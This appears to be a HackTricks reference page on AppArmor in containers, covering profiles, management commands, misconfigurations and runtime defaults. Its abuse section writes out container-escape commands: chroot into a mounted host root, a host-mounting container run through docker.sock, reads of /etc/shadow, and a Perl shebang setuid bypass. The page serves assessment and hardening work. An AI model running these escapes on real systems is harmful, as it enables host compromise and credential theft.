# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor is a **Mandatory Access Control** system that applies restrictions through per-program profiles. Unlike traditional DAC checks, which depend heavily on user and group ownership, AppArmor lets the kernel enforce a policy attached to the process itself. In container environments, this matters because a workload may have enough traditional privilege to attempt an action and still be denied because its AppArmor profile does not allow the relevant path, mount, network behavior, or capability use.

The most important conceptual point is that AppArmor is **path-based**. It reasons about filesystem access through path rules rather than through labels as SELinux does. That makes it approachable and powerful, but it also means bind mounts and alternate path layouts deserve careful attention. If the same host content becomes reachable under a different path, the effect of the policy may not be what the operator first expected.

## Role In Container Isolation

Container security reviews often stop at capabilities and seccomp, but AppArmor continues to matter after those checks. Imagine a container that has more privilege than it should, or a workload that needed one extra capability for operational reasons. AppArmor can still constrain file access, mount behavior, networking, and execution patterns in ways that stop the obvious abuse path. This is why disabling AppArmor "just to get the application working" can quietly transform a merely risky configuration into one that is actively exploitable.

## Lab

To check whether AppArmor is active on the host, use:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

To see what the current container process is running under:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

The difference is instructive. In the normal case, the process should show an AppArmor context tied to the profile chosen by the runtime. In the unconfined case, that extra restriction layer disappears.

You can also inspect what Docker thinks it applied:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Runtime Usage

Docker can apply a default or custom AppArmor profile when the host supports it. Podman can also integrate with AppArmor on AppArmor-based systems, although on SELinux-first distributions the other MAC system often takes center stage. Kubernetes can expose AppArmor policy at the workload level on nodes that actually support AppArmor. LXC and related Ubuntu-family system-container environments also use AppArmor extensively.

The practical point is that AppArmor is not a "Docker feature". It is a host-kernel feature that several runtimes can choose to apply. If the host does not support it or the runtime is told to run unconfined, the supposed protection is not really there.

On Docker-capable AppArmor hosts, the best-known default is `docker-default`. That profile is generated from Moby's AppArmor template and is important because it explains why some capability-based PoCs still fail in a default container. In broad terms, `docker-default` allows ordinary networking, denies writes to much of `/proc`, denies access to sensitive parts of `/sys`, blocks mount operations, and restricts ptrace so that it is not a general host-probing primitive. Understanding that baseline helps distinguish "the container has `CAP_SYS_ADMIN`" from "the container can actually use that capability against the kernel interfaces I care about".

## Profile Management

AppArmor profiles are usually stored under `/etc/apparmor.d/`. A common naming convention is to replace slashes in the executable path with dots. For example, a profile for `/usr/bin/man` is commonly stored as `/etc/apparmor.d/usr.bin.man`. This detail matters during both defense and assessment because once you know the active profile name, you can often locate the corresponding file quickly on the host.

Useful host-side management commands include:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

The reason these commands matter in a container-security reference is that they explain how profiles are actually built, loaded, switched to complain mode, and modified after application changes. If an operator has a habit of moving profiles into complain mode during troubleshooting and forgetting to restore enforcement, the container may look protected in documentation while behaving much more loosely in reality.

### Building And Updating Profiles

`aa-genprof` can observe application behavior and help generate a profile interactively:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` can generate a template profile that can later be loaded with `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

When the binary changes and the policy needs updating, `aa-logprof` can replay denials found in logs and assist the operator in deciding whether to allow or deny them:

```bash
sudo aa-logprof
```

### Logs

AppArmor denials are often visible through `auditd`, syslog, or tools such as `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

This is useful operationally and offensively. Defenders use it to refine profiles. Attackers use it to learn which exact path or operation is being denied and whether AppArmor is the control blocking an exploit chain.

### Identifying The Exact Profile File

When a runtime shows a specific AppArmor profile name for a container, it is often useful to map that name back to the profile file on disk:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

## Misconfigurations

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## Abuse

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

If the container also has a dangerous capability such as `CAP_SYS_ADMIN`, one of the most practical tests is whether AppArmor is the control blocking mount operations or access to sensitive kernel filesystems:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

In environments where a host path is already available through a bind mount, losing AppArmor may also turn a read-only information-disclosure issue into direct host file access:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

The point of these commands is not that AppArmor alone creates the breakout. It is that once AppArmor is removed, many filesystem and mount-based abuse paths become testable immediately.

### Full Example: AppArmor Disabled + Host Root Mounted

If the container already has the host root bind-mounted at `/host`, removing AppArmor can turn a blocked filesystem abuse path into a complete host escape:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Once the shell is executing through the host filesystem, the workload has effectively escaped the container boundary:

```bash
id
hostname
cat /etc/shadow | head
```

### Full Example: AppArmor Disabled + Runtime Socket

If the real barrier was AppArmor around runtime state, a mounted socket can be enough for a complete escape:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

The exact path depends on the mount point, but the end result is the same: AppArmor is no longer preventing access to the runtime API, and the runtime API can launch a host-compromising container.

### Full Example: Path-Based Bind-Mount Bypass

Because AppArmor is path-based, protecting `/proc/**` does not automatically protect the same host procfs content when it is reachable through a different path:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

The impact depends on what exactly is mounted and whether the alternate path also bypasses other controls, but this pattern is one of the clearest reasons AppArmor must be evaluated together with mount layout rather than in isolation.

### Full Example: Shebang Bypass

AppArmor policy sometimes targets an interpreter path in a way that does not fully account for script execution through shebang handling. A historical example involved using a script whose first line points at a confined interpreter:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

This kind of example is important as a reminder that profile intent and actual execution semantics can diverge. When reviewing AppArmor in container environments, interpreter chains and alternate execution paths deserve special attention.

## Checks

The goal of these checks is to answer three questions quickly: is AppArmor enabled on the host, is the current process confined, and did the runtime actually apply a profile to this container?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```

What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
